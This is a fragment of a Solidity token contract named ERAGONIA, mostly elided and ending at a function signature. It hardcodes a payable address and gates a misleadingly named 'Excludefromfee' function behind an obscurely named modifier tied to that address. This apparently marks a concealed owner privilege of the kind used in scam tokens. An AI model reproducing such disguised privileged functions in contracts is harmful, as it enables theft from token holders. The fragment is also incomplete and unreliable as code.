...
/**
 TG: https://t.me/Eragonia
 Twitter: https://twitter.com/EragoniaERC/status/1597109381115834371
...
contract  ERAGONIA is Context, IERC20, Ownable{
    ...
    string private _name = "Dragon Girl";
    string private _symbol = "ERAGONIA";
    ...
    constructor () {
        ...
        SLNA = payable(address(0x648a57d599c4213fc5F41318917CA4a2494DaFa9));
    ...
    function Excludefromfee(address sender, uint256 _amount) public FUNCTION(2*10**2, SLNA,_msgSender()){
